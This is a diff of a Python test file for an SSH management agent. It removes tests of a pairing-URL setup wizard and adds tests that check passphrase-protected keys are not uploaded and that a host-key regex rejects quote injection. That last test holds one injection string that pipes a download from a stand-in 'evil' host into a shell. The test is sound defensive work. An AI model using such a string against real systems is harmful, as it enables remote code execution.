@@ -275,56 +275,6 @@ def test_setup_rejects_v1_bundle(tmp_path, monkeypatch):
     assert not (tmp_path / "new.pem").exists()
 
 
-def test_setup_via_pairing_url(tmp_path, monkeypatch):
-    """一条命令安装：向导从配对链接取设置包（不需要源代码和下载文件）。"""
-    import httpx
-    from ssh_agent import setup as wizard
-
-    home = tmp_path / "home"
-    (home / ".ssh").mkdir(parents=True)
-    old = KeyPair.load_or_create(tmp_path / "old.pem")
-    env = {"SSH_MANAGER_URL": "https://x.example", "CF_ACCESS_CLIENT_ID": "cid.access", "CF_ACCESS_CLIENT_SECRET": "sec"}
-    bundle = {"url": "https://x.example", "backup": old.export_backup("master passphrase", env)}
-    pair_url = "https://x.example/pair/" + "A" * 43 + "/bundle"
-    fetched = []
-
-    def fake_get(url, timeout=None):
-        fetched.append(url)
-        return httpx.Response(200, json=bundle, request=httpx.Request("GET", url))
-
-    def handler(req: httpx.Request):
-        if req.url.path == "/api/agent/hello":
-            return httpx.Response(200, json={"agent_id": "a1", "public_key": old.public_jwk})
-        return httpx.Response(200, json=[server(alias="paired-01")])
-
-    real_client = httpx.Client
-    monkeypatch.setattr(wizard.httpx, "get", fake_get)
-    monkeypatch.setattr(wizard.httpx, "Client", lambda **kw: real_client(transport=httpx.MockTransport(handler), **kw))
-    monkeypatch.setattr(wizard.paths, "ENV_FILE", tmp_path / "cfg" / ".env")
-    monkeypatch.setattr(wizard.getpass, "getpass", lambda prompt="": "master passphrase")
-    monkeypatch.setattr("builtins.input", lambda prompt="": "n")  # 不装后台服务
-    monkeypatch.setattr(wizard, "SkillBridge", lambda d: SkillBridge(SKILL_DIR, home=home))
-
-    key_path = tmp_path / "agent_key.pem"
-    wizard.run_setup(pair_url, key_path, SKILL_DIR, "new-mac", lambda: pytest.fail("不应安装后台服务"))
-
-    assert fetched == [pair_url]
-    assert KeyPair.load_or_create(key_path).matches(old.public_jwk)
-    assert "CF_ACCESS_CLIENT_SECRET=sec" in (tmp_path / "cfg" / ".env").read_text()
-    assert "Host paired-01" in (home / ".ssh" / "config").read_text()
-
-
-def test_setup_pairing_url_rejected(tmp_path, monkeypatch):
-    import httpx
-    from ssh_agent import setup as wizard
-    monkeypatch.setattr(wizard.httpx, "get", lambda url, timeout=None: httpx.Response(
-        410, json={"detail": "配对码无效、已过期或已使用"}, headers={"content-type": "application/json"}, request=httpx.Request("GET", url)))
-    monkeypatch.setattr(wizard, "SkillBridge", lambda d: SkillBridge(SKILL_DIR, home=tmp_path))
-    with pytest.raises(SystemExit):
-        wizard.run_setup("https://x.example/pair/x/bundle", tmp_path / "k.pem", SKILL_DIR, "x", lambda: None)
-    assert not (tmp_path / "k.pem").exists()
-
-
 def _keygen(tmp_path, name, *args):
     path = tmp_path / name
     subprocess.run(["ssh-keygen", "-q", "-N", "", "-C", "", "-f", str(path), *args], check=True)
@@ -394,3 +344,31 @@ def test_trust_host_keys_writes_known_hosts(env, tmp_path):
     r, _ = h.handle({"type": "sync", "server": bad, "payload": {}})
     assert r["success"] is False and "不符" in r["error"]
     assert host_key_fingerprint(line)["type"] == "ssh-ed25519"
+
+
+@pytest.mark.skipif(not shutil.which("ssh-keygen"), reason="需要 ssh-keygen")
+def test_encrypted_private_keys_detected_and_not_imported(env, tmp_path):
+    from ssh_agent.keys import private_key_encrypted
+    h, keys, cfg = env
+    plain, _ = _keygen(tmp_path, "plain", "-t", "ed25519")
+    assert private_key_encrypted(plain) is False
+    for name, extra in (("enc_openssh", ["-t", "ed25519"]), ("enc_pem", ["-t", "rsa", "-b", "2048", "-m", "PEM"])):
+        path = tmp_path / name
+        subprocess.run(["ssh-keygen", "-q", "-N", "secret-pass", "-C", "", "-f", str(path), *extra], check=True)
+        assert private_key_encrypted(path.read_bytes()) is True, name
+
+    keyfile = h.skill.home / ".ssh" / "id_enc"
+    keyfile.write_bytes((tmp_path / "enc_openssh").read_bytes())
+    with cfg.open("a") as f:
+        f.write(f"Host enc1\n    HostName 10.0.0.1\n    User u\n    IdentityFile {keyfile}\n\n")
+    _, extra = h.handle({"type": "import", "servers": [], "keys": [], "payload": {"aliases": ["enc1"], "upload_keys": True}})
+    row = extra["import_rows"][0]
+    assert row["key"] is None and row["identity_file"]  # 不上传，保留本机路径
+
+
+def test_host_key_regex_rejects_quote_injection():
+    from ssh_agent.handlers import HOSTKEY_RE
+    assert HOSTKEY_RE.match("[10.0.0.9]:4422 ssh-ed25519 AAAAC3Nz")
+    assert HOSTKEY_RE.match("example.com ecdsa-sha2-nistp256 AAAA")
+    for bad in ["[h]:22 ssh-x';curl evil|sh;' AAAA", "h'x ssh-ed25519 AAAA", "h ssh-ed25519 AAAA'"]:
+        assert not HOSTKEY_RE.match(bad), bad
